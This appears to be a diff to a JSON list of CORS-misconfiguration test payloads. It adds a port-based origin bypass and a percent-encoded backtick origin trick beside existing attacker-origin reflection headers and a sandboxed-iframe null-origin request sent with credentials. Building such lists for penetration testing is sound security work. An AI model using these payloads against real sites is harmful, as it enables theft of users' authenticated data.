@@ -7,14 +7,16 @@
         {"payload": "Origin: https://attacker.com", "description": "Arbitrary origin to test reflection in Access-Control-Allow-Origin", "waf_bypass": false},
         {"payload": "Origin: https://evil.com", "description": "Evil origin reflection test", "waf_bypass": false},
         {"payload": "Origin: https://target.com.attacker.com", "description": "Subdomain of target appended to attacker domain to bypass suffix checks", "waf_bypass": true},
-        {"payload": "Origin: https://attacker.comtarget.com", "description": "Attacker domain prefixed with target to bypass prefix checks", "waf_bypass": true}
+        {"payload": "Origin: https://attacker.comtarget.com", "description": "Attacker domain prefixed with target to bypass prefix checks", "waf_bypass": true},
+        {"payload": "Origin: https://target.com:8080", "description": "Port-based bypass — validators match domain but not port", "waf_bypass": true}
       ]
     },
     "null_origin": {
       "description": "Test for null origin CORS bypass (file:// or sandboxed iframe)",
       "payloads": [
         {"payload": "Origin: null", "description": "Null origin to test if Access-Control-Allow-Origin: null is returned", "waf_bypass": false},
-        {"payload": "<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html,<script>var req=new XMLHttpRequest();req.open('GET','https://target.com/api',true);req.withCredentials=true;req.send();</script>\">", "description": "Sandboxed iframe to generate null origin request", "waf_bypass": false}
+        {"payload": "<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" src=\"data:text/html,<script>var req=new XMLHttpRequest();req.open('GET','https://target.com/api',true);req.withCredentials=true;req.send();</script>\">", "description": "Sandboxed iframe to generate null origin request", "waf_bypass": false},
+        {"payload": "Origin: https://target.com%60evil.com", "description": "Backtick percent-encoded — parser quirk in some browsers/servers", "waf_bypass": true}
       ]
     },
     "subdomain_wildcard": {
